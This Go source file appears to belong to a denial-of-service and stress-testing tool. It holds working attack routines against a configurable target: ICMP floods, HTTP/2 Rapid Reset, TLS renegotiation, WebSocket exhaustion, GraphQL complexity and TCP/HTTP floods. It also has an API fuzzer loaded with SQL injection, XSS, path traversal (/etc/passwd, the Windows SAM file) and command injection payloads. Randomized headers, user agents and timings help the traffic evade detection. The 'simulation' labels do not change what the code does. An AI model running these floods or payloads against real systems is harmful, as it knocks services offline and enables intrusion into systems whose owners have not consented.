// createDNSQuery creates a DNS query packet
func createDNSQuery(domain string, dnsType uint16) []byte {
	// Generate a random 16-bit transaction ID
	txID := make([]byte, 2)
	rand.Read(txID)

	// Initialize the query with header fields
	query := []byte{
		txID[0], txID[1], // Transaction ID (random)
		0x01, 0x00, // Flags: standard query, recursion desired
		0x00, 0x01, // Questions: 1
		0x00, 0x00, // Answer RRs: 0
		0x00, 0x00, // Authority RRs: 0
		0x00, 0x00, // Additional RRs: 0
	}

	// Add the domain name to the query
	domainParts := strings.Split(domain, ".")
	for _, part := range domainParts {
		query = append(query, byte(len(part)))
		query = append(query, []byte(part)...)
	}

	// Terminate domain name with zero length
	query = append(query, 0x00)

	// Add query type (e.g., ANY=255) and class (IN=1)
	query = append(query, byte(dnsType>>8), byte(dnsType))
	query = append(query, 0x00, 0x01) // Class: IN (Internet)

	return query
}

func icmpFlood(ctx context.Context) {
	logger.Printf("Starting ICMP Flood attack simulation")

	// Try to create a raw ICMP socket
	conn, err := net.Dial("ip4:icmp", config.TargetIP)
	if err != nil {
		logger.Printf("Failed to create ICMP connection. This requires root/administrator privileges: %v", err)
		return
	}
	defer conn.Close()

	logger.Printf("ICMP Flood using %d workers against %s", config.Concurrency, config.TargetIP)

	// Create channel for work distribution
	ch := make(chan int, config.Concurrency)
	var wg sync.WaitGroup

	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			// Basic ICMP Echo Request packet structure
			// https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol
			icmpPacket := []byte{
				8,    // Type: Echo Request
				0,    // Code: 0
				0, 0, // Checksum (placeholder)
				0, 0, // Identifier (randomized per worker)
				0, 0, // Sequence number (incremented per packet)
				// Payload (timestamp to track latency)
				0, 0, 0, 0, 0, 0, 0, 0,
				// Additional payload to make packet larger
				0x74, 0x65, 0x73, 0x74, // "test"
			}

			// Set a unique identifier for this worker
			icmpPacket[4] = byte(workerID >> 8)
			icmpPacket[5] = byte(workerID)

			var sequence uint16 = 0

			for {
				select {
				case <-ctx.Done():
					return
				case <-ch:
					// Increment sequence number for each packet
					sequence++
					icmpPacket[6] = byte(sequence >> 8)
					icmpPacket[7] = byte(sequence)

					// Add timestamp to payload for latency tracking
					binary.BigEndian.PutUint64(icmpPacket[8:16], uint64(time.Now().UnixNano()))

					// Calculate and set ICMP checksum
					checksum := calculateICMPChecksum(icmpPacket)
					icmpPacket[2] = byte(checksum >> 8)
					icmpPacket[3] = byte(checksum)

					// Send the packet
					n, err := conn.Write(icmpPacket)

					// Update metrics
					metrics.mu.Lock()
					metrics.TotalRequests++
					metrics.BytesSent += int64(n)
					if err != nil {
						metrics.FailedRequests++
						logError("Failed to send ICMP packet", err)
					} else {
						metrics.SuccessRequests++
					}
					metrics.mu.Unlock()

					// Random delay if timing randomization is enabled
					if config.RandomizeTimings {
						time.Sleep(getRandomDuration(config.TimingMin, config.TimingMax))
					}
				}
			}
		}(i)
	}

	// Send work to the pool
	go func() {
		for i := 0; i < config.NumRequests; i++ {
			select {
			case <-ctx.Done():
				return
			case ch <- i:
				// Work sent
			}
		}
	}()

	// Wait for context cancellation
	<-ctx.Done()
	logger.Printf("ICMP Flood attack simulation completed")
}

// calculateICMPChecksum calculates the ICMP checksum
func calculateICMPChecksum(data []byte) uint16 {
	var sum uint32

	// Sum all 16-bit words
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 | uint32(data[i+1])
	}

	// Add last byte if length is odd
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}

	// Add carry bits
	sum = (sum >> 16) + (sum & 0xffff)
	sum = sum + (sum >> 16)

	// Return one's complement
	return ^uint16(sum)
}

func http2RapidReset(ctx context.Context) {
	logger.Printf("Starting HTTP/2 Rapid Reset attack simulation")

	tr := &http2.Transport{
		AllowHTTP:          true,
		DisableCompression: true,
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   config.ConnectionTimeout,
	}

	targetURL := config.TargetURL
	if !strings.HasPrefix(targetURL, "http") {
		targetURL = "http://" + targetURL
	}
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		logger.Printf("Invalid URL provided")
		return
	}
	if parsedURL.Scheme != "https" {
		parsedURL.Scheme = "http"
	}

	ch := make(chan int, config.Concurrency)
	var wg sync.WaitGroup
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			for {
				select {
				case <-ctx.Done():
					return
				case <-ch:
					// Create a context with cancellation for this request
					reqCtx, cancelReq := context.WithCancel(ctx)

					// Create request with the cancellable context
					req, err := http.NewRequestWithContext(reqCtx, "GET", parsedURL.String(), nil)
					if err != nil {
						cancelReq() // Clean up
						logError("Failed to create HTTP/2 request", err)
						continue
					}

					// Intentionally reset the stream after a short delay
					go func() {
						time.Sleep(100 * time.Millisecond)
						if ctx.Err() == nil {
							cancelReq() // Cancel the request context
						}
					}()

					resp, err := client.Do(req)

					// Clean up the request context
					cancelReq()

					metrics.mu.Lock()
					metrics.TotalRequests++
					if err != nil {
						if !strings.Contains(err.Error(), "stream closed") &&
							!strings.Contains(err.Error(), "http2: Transport received RST_STREAM") {
							logError("HTTP/2 request error", err)
						}
						metrics.FailedRequests++
					} else {
						metrics.SuccessRequests++
						if resp != nil && resp.Body != nil {
							io.Copy(io.Discard, resp.Body)
							resp.Body.Close()
						}
					}
					metrics.mu.Unlock()

					if config.RandomizeTimings {
						time.Sleep(getRandomDuration(config.TimingMin, config.TimingMax))
					}
				}
			}
		}(i)
	}

	go func() {
		for i := 0; i < config.NumRequests; i++ {
			select {
			case <-ctx.Done():
				return
			case ch <- i:
			}
		}
	}()

	<-ctx.Done()
	logger.Printf("HTTP/2 Rapid Reset attack simulation completed")
}

func sslRenegotiationAttack(ctx context.Context, ports []int) {
	logger.Printf("Starting SSL/TLS Renegotiation attack simulation")

	ch := make(chan int, config.Concurrency)
	var wg sync.WaitGroup
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			for {
				select {
				case <-ctx.Done():
					return
				case portIndex := <-ch:
					port := ports[portIndex%len(ports)]
					address := fmt.Sprintf("%s:%d", config.TargetIP, port)

					tlsConfig := &tls.Config{
						InsecureSkipVerify: true,
						Renegotiation:      tls.RenegotiateOnceAsClient,
					}

					conn, err := tls.DialWithDialer(&net.Dialer{
						Timeout: config.ConnectionTimeout,
					}, "tcp", address, tlsConfig)
					if err != nil {
						logError(fmt.Sprintf("Failed to establish TLS connection to %s", address), err)
						metrics.mu.Lock()
						metrics.TotalRequests++
						metrics.FailedRequests++
						metrics.mu.Unlock()
						continue
					}

					metrics.mu.Lock()
					metrics.TotalRequests++
					metrics.SuccessRequests++
					metrics.mu.Unlock()

					// Attempt multiple renegotiations
					for i := 0; i < 5; i++ {
						err = conn.Handshake()
						if err != nil {
							if config.VerboseLogging &&
								!strings.Contains(err.Error(), "handshake already in progress") &&
								!strings.Contains(err.Error(), "use of closed network connection") &&
								!strings.Contains(err.Error(), "broken pipe") {
								logError("TLS renegotiation error", err)
							}
							break
						}
						time.Sleep(50 * time.Millisecond)
					}
					conn.Close()

					if config.RandomizeTimings {
						time.Sleep(getRandomDuration(config.TimingMin, config.TimingMax))
					}
				}
			}
		}()
	}

	go func() {
		for i := 0; i < config.NumRequests; i++ {
			select {
			case <-ctx.Done():
				return
			case ch <- i:
			}
		}
	}()

	<-ctx.Done()
	logger.Printf("SSL/TLS Renegotiation attack simulation completed")
}

func webSocketExhaustion(ctx context.Context) {
	logger.Printf("Starting WebSocket exhaustion test")

	targetURL := config.TargetURL
	if !strings.HasPrefix(targetURL, "ws") {
		targetURL = "ws://" + targetURL
	}
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		logger.Printf("Invalid URL provided: %v", err)
		return
	}
	if parsedURL.Scheme == "http" {
		parsedURL.Scheme = "ws"
	} else if parsedURL.Scheme == "https" {
		parsedURL.Scheme = "wss"
	}
	if parsedURL.Path == "" {
		parsedURL.Path = "/ws"
	}

	ch := make(chan int, config.Concurrency)
	var wg sync.WaitGroup
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			for {
				select {
				case <-ctx.Done():
					return
				case <-ch:
					dialer := websocket.Dialer{
						HandshakeTimeout: config.ConnectionTimeout,
						TLSClientConfig: &tls.Config{
							InsecureSkipVerify: true,
						},
					}

					conn, _, err := dialer.Dial(parsedURL.String(), nil)
					metrics.mu.Lock()
					metrics.TotalRequests++
					if err != nil {
						logError("Failed to connect to WebSocket endpoint", err)
						metrics.FailedRequests++
						metrics.mu.Unlock()
						continue
					}
					metrics.SuccessRequests++
					metrics.mu.Unlock()

					// Keep connection alive with periodic pings
					go func() {
						ticker := time.NewTicker(30 * time.Second)
						defer ticker.Stop()
						for {
							select {
							case <-ctx.Done():
								return
							case <-ticker.C:
								if err := conn.WriteControl(websocket.PingMessage, []byte{}, time.Now().Add(10*time.Second)); err != nil {
									return
								}
							}
						}
					}()

					// Wait for context cancellation or connection error
					select {
					case <-ctx.Done():
					case <-time.After(getRandomDuration(5*time.Second, 30*time.Second)):
					}

					conn.Close()

					if config.RandomizeTimings {
						time.Sleep(getRandomDuration(config.TimingMin, config.TimingMax))
					}
				}
			}
		}(i)
	}

	go func() {
		for i := 0; i < config.NumRequests; i++ {
			select {
			case <-ctx.Done():
				return
			case ch <- i:
			}
		}
	}()

	<-ctx.Done()
	logger.Printf("WebSocket exhaustion test simulation completed")
}

func apiFuzzing(ctx context.Context) {
	logger.Printf("Starting API Fuzzing test")

	parsedURL, err := url.Parse(config.TargetURL)
	if err != nil {
		logger.Printf("Error parsing URL: %v", err)
		return
	}

	apiEndpoint := parsedURL.String()

	payloads := []string{
		// SQL Injection
		"' OR '1'='1", "1; DROP TABLE users", "1' UNION SELECT * FROM users--",
		// XSS
		"<script>alert('XSS')</script>", "javascript:alert(1)", "<img src=x onerror=alert('XSS')>",
		// Path Traversal
		"../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\SAM",
		// Command Injection
		"|| ping -c 4 127.0.0.1", "& dir", "; ls -la",
		// Special Characters
		"!@#$%^&*()", "你好世界", "\\x00\\x00\\x00\\x00",
		// Buffer Overflow
		strings.Repeat("A", 1024), strings.Repeat("A", 4096),
		// JSON/XML Injection
		`{"user": {"$ne": null}}`, "<xml>test</xml><script>alert(1)</script>",
		// Invalid UTF-8
		string([]byte{0xff, 0xfe, 0xfd}),
	}

	methods := []string{"GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"}
	contentTypes := []string{
		"application/json",
		"application/x-www-form-urlencoded",
		"multipart/form-data",
		"text/plain",
		"application/xml",
	}

	client := &http.Client{
		Timeout: config.ConnectionTimeout,
		Transport: &http.Transport{
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 100,
			MaxConnsPerHost:     config.Concurrency,
			IdleConnTimeout:     30 * time.Second,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		},
	}

	ch := make(chan int, config.Concurrency)
	var wg sync.WaitGroup
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			for {
				select {
				case <-ctx.Done():
					return
				case <-ch:
					// Choose random method and payload
					method := methods[rand.Intn(len(methods))]
					payload := payloads[rand.Intn(len(payloads))]
					contentType := contentTypes[rand.Intn(len(contentTypes))]

					var req *http.Request
					var err error

					// Prepare request based on method
					switch method {
					case "GET":
						// Add payload to URL parameters
						reqURL := fmt.Sprintf("%s?param=%s", apiEndpoint, url.QueryEscape(payload))
						req, err = http.NewRequestWithContext(ctx, method, reqURL, nil)
					case "POST", "PUT", "PATCH":
						var body io.Reader
						switch contentType {
						case "application/json":
							jsonPayload := map[string]interface{}{
								"data": payload,
								"nested": map[string]string{
									"field": payload,
								},
							}
							jsonData, _ := json.Marshal(jsonPayload)
							body = bytes.NewBuffer(jsonData)
						case "application/x-www-form-urlencoded":
							form := url.Values{}
							form.Set("data", payload)
							body = strings.NewReader(form.Encode())
						case "multipart/form-data":
							var b bytes.Buffer
							w := multipart.NewWriter(&b)
							fw, err := w.CreateFormField("data")
							if err != nil {
								continue
							}
							fw.Write([]byte(payload))
							w.Close()
							body = &b
							contentType = w.FormDataContentType()
						default:
							body = strings.NewReader(payload)
						}
						req, err = http.NewRequestWithContext(ctx, method, apiEndpoint, body)
					default:
						req, err = http.NewRequestWithContext(ctx, method, apiEndpoint, nil)
					}

					if err != nil {
						logError("Failed to create fuzzed request", err)
						continue
					}

					// Set headers
					req.Header.Set("Content-Type", contentType)
					if config.RandomizeHeaders {
						addRandomHeaders(req)
					}
					if config.RandomizeUserAgent {
						req.Header.Set("User-Agent", getRandomUserAgent())
					}

					// Send request
					resp, err := client.Do(req)

					metrics.mu.Lock()
					metrics.TotalRequests++
					if err != nil {
						metrics.FailedRequests++
						metrics.mu.Unlock()
						logError("Fuzzing request failed", err)
						continue
					}
					metrics.SuccessRequests++
					metrics.mu.Unlock()

					// Process response
					if resp != nil && resp.Body != nil {
						io.Copy(io.Discard, resp.Body)
						resp.Body.Close()
					}

					if config.RandomizeTimings {
						time.Sleep(getRandomDuration(config.TimingMin, config.TimingMax))
					}
				}
			}
		}(i)
	}

	go func() {
		for i := 0; i < config.NumRequests; i++ {
			select {
			case <-ctx.Done():
				return
			case ch <- i:
			}
		}
	}()

	<-ctx.Done()
	logger.Printf("API Fuzzing test completed")
}

func reportMetrics(ctx context.Context) {
	ticker := time.NewTicker(config.MetricsInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			printMetrics()
		}
	}
}

func printMetrics() {
	metrics.mu.Lock()
	defer metrics.mu.Unlock()

	elapsed := time.Since(metrics.StartTime)
	rps := float64(metrics.TotalRequests) / elapsed.Seconds()

	logger.Printf("--- Metrics ---")
	logger.Printf("  Elapsed Time:    %v", elapsed)
	logger.Printf("  Total Requests:  %d", metrics.TotalRequests)
	logger.Printf("  Success:         %d", metrics.SuccessRequests)
	logger.Printf("  Failed:          %d", metrics.FailedRequests)
	logger.Printf("  Requests/sec:    %.2f", rps)
	logger.Printf("  Bytes Sent:      %d", metrics.BytesSent)
	logger.Printf("  Bytes Received:  %d", metrics.BytesReceived)
	//#TODO: add other metrics: response time distribution

	if len(metrics.ResponseTimes) > 0 {
		avgResponseTime := calculateAverageResponseTime(metrics.ResponseTimes)
		logger.Printf("  Avg Response Time: %v", avgResponseTime)
	}

	if len(metrics.OpenPorts) > 0 {
		logger.Printf("  Open Ports:      %v", metrics.OpenPorts)
	}
}

func calculateAverageResponseTime(times []time.Duration) time.Duration {
	var total time.Duration
	for _, t := range times {
		total += t
	}
	return time.Duration(int64(total) / int64(len(times)))
}

func reportFinalMetrics() {
	metrics.mu.Lock()
	defer metrics.mu.Unlock()

	elapsed := time.Since(metrics.StartTime)
	rps := float64(metrics.TotalRequests) / elapsed.Seconds()

	logger.Printf("--- Final Metrics ---")
	logger.Printf("  Elapsed Time:    %v", elapsed)
	logger.Printf("  Total Requests:  %d", metrics.TotalRequests)
	logger.Printf("  Success:         %d", metrics.SuccessRequests)
	logger.Printf("  Failed:          %d", metrics.FailedRequests)
	logger.Printf("  Requests/sec:    %.2f", rps)
	logger.Printf("  Bytes Sent:      %d", metrics.BytesSent)
	logger.Printf("  Bytes Received:  %d", metrics.BytesReceived)
	if len(metrics.ResponseTimes) > 0 {
		avgResponseTime := calculateAverageResponseTime(metrics.ResponseTimes)
		logger.Printf("  Avg Response Time: %v", avgResponseTime)
	}
	if len(metrics.OpenPorts) > 0 {
		logger.Printf("  Open Ports:      %v", metrics.OpenPorts)
	}
}

func runWarmup(ctx context.Context, openPorts []int) {
	// Reduced intensity for warmup
	warmupConcurrency := config.Concurrency / 4
	if warmupConcurrency < 1 {
		warmupConcurrency = 1
	}
	warmupRequests := config.NumRequests / 10
	if warmupRequests < 1 {
		warmupRequests = 1
	}

	// Use a smaller client for warmup to reduce initial load
	client := &http.Client{
		Timeout: config.ConnectionTimeout,
		Transport: &http.Transport{
			MaxIdleConns:        10,
			MaxIdleConnsPerHost: 10,
		},
	}

	// Warm-up HTTP
	if config.EnableHTTPFlood {
		httpFloodWarmup(ctx, warmupConcurrency, warmupRequests, client)
	}

	// Warm-up TCP (send fewer packets)
	if config.EnableTCPFlood {
		tcpFloodWarmup(ctx, warmupConcurrency, warmupRequests, openPorts)
	}
}

func httpFloodWarmup(ctx context.Context, concurrency int, numRequests int, client *http.Client) {
	logger.Printf("Starting HTTP warm-up with %d concurrent connections", concurrency)

	ch := make(chan int, concurrency)
	var wg sync.WaitGroup

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for range ch {
				select {
				case <-ctx.Done():
					return
				default:
					req, err := http.NewRequestWithContext(ctx, "GET", config.TargetURL, nil)
					if err != nil {
						continue
					}

					req.Header.Set("Connection", "close") // Use close to avoid keep-alive during warmup

					resp, err := client.Do(req)
					if err == nil && resp != nil && resp.Body != nil {
						io.Copy(io.Discard, resp.Body) // Read and discard body
						resp.Body.Close()
					}
				}
			}
		}()
	}

	for i := 0; i < numRequests; i++ {
		select {
		case <-ctx.Done():
			return // not *break*
		case ch <- i:
		}
	}
	close(ch)
	wg.Wait()
	logger.Printf("HTTP warm-up completed")
}

func tcpFloodWarmup(ctx context.Context, concurrency int, numRequests int, ports []int) {
	logger.Printf("Starting TCP warm-up with %d concurrent connections", concurrency)

	ch := make(chan int, concurrency)
	var wg sync.WaitGroup

	// Use smaller buffer for warmup
	buf := make([]byte, 512)

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			for range ch {
				select {
				case <-ctx.Done():
					return
				default:
					port := ports[rand.Intn(len(ports))] // Use a random port
					address := fmt.Sprintf("%s:%d", config.TargetIP, port)

					conn, err := net.DialTimeout("tcp", address, config.ConnectionTimeout)
					if err != nil {
						continue
					}

					// Send a small amount of data
					rand.Read(buf)
					conn.Write(buf)
					conn.Close()
				}
			}
		}()
	}

	for i := 0; i < numRequests; i++ {
		select {
		case <-ctx.Done():
			return
		case ch <- i:
		}
	}
	close(ch)
	wg.Wait()
	logger.Printf("TCP warm-up completed")
}

func logError(message string, err error) {
	if config.VerboseLogging && err != nil {
		logger.Printf("ERROR: %s: %v", message, err)
	}
}

// Get a random user agent from the list
func getRandomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

// Add random headers to the HTTP request
func addRandomHeaders(req *http.Request) {
	numHeaders := rand.Intn(len(customHeaders)) // Random number of headers
	rand.Shuffle(len(customHeaders), func(i, j int) {
		customHeaders[i], customHeaders[j] = customHeaders[j], customHeaders[i]
	})

	for i := 0; i < numHeaders; i++ {
		headerParts := strings.SplitN(customHeaders[i], ":", 2)
		if len(headerParts) == 2 {
			req.Header.Add(strings.TrimSpace(headerParts[0]), strings.TrimSpace(headerParts[1]))
		}
	}
}

// Get a random duration between min and max
func getRandomDuration(min, max time.Duration) time.Duration {
	if min == max {
		return min
	}
	diff := max - min
	return min + time.Duration(rand.Int63n(diff.Nanoseconds()))
}

// Check if a string is a valid URL
// func isValidURL(toTest string) bool {
// 	_, err := url.ParseRequestURI(toTest)
// 	if err != nil {
// 		return false
// 	}

// 	u, err := url.Parse(toTest)
// 	if err != nil || u.Scheme == "" || u.Host == "" {
// 		return false
// 	}

// 	return true
// }

// Check if a string is a valid IP address
// func isValidIP(ip string) bool {
// 	return net.ParseIP(ip) != nil
// }

// GraphQL Introspection Query
const introspectionQuery = `
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
`

// GraphQL schema representation (simplified)
type GraphQLSchema struct {
	QueryType string        `json:"queryType"`
	Types     []GraphQLType `json:"types"`
}

type GraphQLType struct {
	Kind   string         `json:"kind"`
	Name   string         `json:"name"`
	Fields []GraphQLField `json:"fields"`
}

type GraphQLField struct {
	Name string            `json:"name"`
	Type GraphQLFieldType  `json:"type"`
	Args []GraphQLFieldArg `json:"args"`
}

type GraphQLFieldArg struct {
	Name string           `json:"name"`
	Type GraphQLFieldType `json:"type"`
}

type GraphQLFieldType struct {
	Kind   string            `json:"kind"`
	Name   string            `json:"name"`
	OfType *GraphQLFieldType `json:"ofType"`
}

// Fetches the GraphQL schema using an introspection query
func getGraphQLSchema(endpoint string) (GraphQLSchema, error) {
	var schemaData map[string]interface{}
	var parsedSchema GraphQLSchema

	// Create the request body
	requestBody, err := json.Marshal(map[string]string{
		"query": introspectionQuery,
	})
	if err != nil {
		return parsedSchema, fmt.Errorf("error marshaling GraphQL introspection query: %w", err)
	}

	// Create the HTTP request
	req, err := http.NewRequest("POST", endpoint, bytes.NewBuffer(requestBody))
	if err != nil {
		return parsedSchema, fmt.Errorf("error creating GraphQL introspection request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	// Create an HTTP client (reuse the main client)
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return parsedSchema, fmt.Errorf("error executing GraphQL introspection request: %w", err)
	}
	defer resp.Body.Close()

	// Read the response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return parsedSchema, fmt.Errorf("error reading GraphQL introspection response: %w", err)
	}

	// Unmarshal the response
	var responseMap map[string]map[string]interface{}
	if err := json.Unmarshal(body, &responseMap); err != nil {
		return parsedSchema, fmt.Errorf("error unmarshaling GraphQL introspection response: %w, response was: %v", err, string(body))
	}

	// Extract schema data
	schemaData, ok := responseMap["data"]["__schema"].(map[string]interface{})
	if !ok {
		return parsedSchema, fmt.Errorf("invalid schema data in response: %s", string(body))
	}
	// Unmarshal into GraphQLSchema struct
	schemaBytes, err := json.Marshal(schemaData)
	if err != nil {
		return parsedSchema, fmt.Errorf("error remarshaling for schema struct: %w", err)
	}

	if err := json.Unmarshal(schemaBytes, &parsedSchema); err != nil {
		return parsedSchema, fmt.Errorf("error unmarshaling into GraphQLSchema struct: %w", err)
	}

	return parsedSchema, nil
}

// unwrapGraphQLType recursively unwraps the nested type information.
func unwrapGraphQLType(fieldType GraphQLFieldType) string {
	if fieldType.Kind == "NON_NULL" || fieldType.Kind == "LIST" {
		if fieldType.OfType != nil {
			return unwrapGraphQLType(*fieldType.OfType)
		}
		return "" // Should not happen in a valid schema
	}
	return fieldType.Name
}

// Generates a complex GraphQL query based on the fetched schema
func generateComplexGraphQLQuery(schema GraphQLSchema) (string, error) {
	var queryBuilder strings.Builder

	queryBuilder.WriteString("query ComplexQuery {\n")

	// Find the query type
	var queryType *GraphQLType
	for _, t := range schema.Types {
		if t.Name == schema.QueryType {
			queryType = &t
			break
		}
	}

	if queryType == nil {
		return "", fmt.Errorf("query type '%s' not found in schema", schema.QueryType)
	}

	// Iterate through fields of the query type
	for _, field := range queryType.Fields {
		// Add a check for SCALAR, OBJECT or LIST
		fieldTypeName := unwrapGraphQLType(field.Type)

		if fieldTypeName != "" && field.Type.Kind != "SCALAR" { // If its not a scalar we must go deeper
			queryBuilder.WriteString(fmt.Sprintf("  %s {\n", field.Name))
			// Find the type definition for this field
			var fieldType *GraphQLType
			for _, t := range schema.Types {
				if t.Name == fieldTypeName {
					fieldType = &t
					break
				}
			}
			// Iterate through fields if the field is not a scalar
			if fieldType != nil {
				for _, innerField := range fieldType.Fields {
					if unwrapGraphQLType(innerField.Type) != "" && innerField.Type.Kind == "SCALAR" {
						queryBuilder.WriteString(fmt.Sprintf("    %s\n", innerField.Name))
					}
				}
			}
			queryBuilder.WriteString("  }\n")

		} else if field.Type.Kind == "SCALAR" {
			queryBuilder.WriteString(fmt.Sprintf("  %s\n", field.Name))
		}
	}

	queryBuilder.WriteString("}\n")
	return queryBuilder.String(), nil
}

// Modify graphQLComplexityAttack to use the new functions:
func graphQLComplexityAttack(ctx context.Context) {
	logger.Printf("Starting GraphQL complexity attack")

	// Determine the GraphQL endpoint (Do it manually!)
	parsedURL, err := url.Parse(config.TargetURL)
	if err != nil {
		logger.Printf("Error parsing URL: %v", err)
		return
	}
	parsedURL.Path = "/graphql" //  Common path, adjust if needed
	graphqlEndpoint := parsedURL.String()

	// 1. Fetch the schema
	schema, err := getGraphQLSchema(graphqlEndpoint)
	if err != nil {
		logger.Printf("Error fetching GraphQL schema: %v", err)
		return
	}

	// 2. Generate a complex query
	complexQuery, err := generateComplexGraphQLQuery(schema)
	if err != nil {
		logger.Printf("Error generating complex GraphQL query: %v", err)
		return
	}

	if config.VerboseLogging {
		logger.Printf("Generated GraphQL Query:\n%s", complexQuery)
	}

	// 3. Send the query repeatedly (similar to httpFlood)
	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: config.ConnectionTimeout,
		Transport: &http.Transport{
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 100,
			MaxConnsPerHost:     config.Concurrency,
			IdleConnTimeout:     30 * time.Second,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // Or configure TLS properly
			DisableCompression:  true,
		},
	}

	// Create channel for work distribution
	ch := make(chan int, config.Concurrency)

	// Create worker goroutines
	var wg sync.WaitGroup
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ch:
					// Create the request body
					requestBody, err := json.Marshal(map[string]string{
						"query": complexQuery,
					})
					if err != nil {
						logError("GraphQL request body marshaling error", err)
						continue
					}

					// Create the HTTP request
					req, err := http.NewRequestWithContext(ctx, "POST", graphqlEndpoint, bytes.NewBuffer(requestBody))
					if err != nil {
						logError("GraphQL request creation error", err)
						continue
					}
					req.Header.Set("Content-Type", "application/json")

					// Execute request
					resp, err := client.Do(req)

					// Update metrics
					metrics.mu.Lock()
					metrics.TotalRequests++
					if err != nil {
						metrics.FailedRequests++
						metrics.mu.Unlock()
						logError("GraphQL request error", err) // Log the error
						continue
					} else {
						metrics.SuccessRequests++
					}
					metrics.mu.Unlock()

					// Read and close response body
					if resp != nil && resp.Body != nil {
						body, _ := io.ReadAll(resp.Body)
						resp.Body.Close()
						metrics.mu.Lock()
						metrics.BytesReceived += int64(len(body))
						metrics.mu.Unlock()
					}

					// Random delay if timing randomization is enabled
					if config.RandomizeTimings {
						time.Sleep(getRandomDuration(config.TimingMin, config.TimingMax))
					}
				}
			}
		}(i)
	}

	// Send work to the pool
	go func() {
		for i := 0; i < config.NumRequests; i++ {
			select {
			case <-ctx.Done():
				return
			case ch <- i:
				// Work sent
			}
		}
	}()

	// Wait for context cancellation
	<-ctx.Done()
	logger.Printf("GraphQL complexity attack test completed")

}
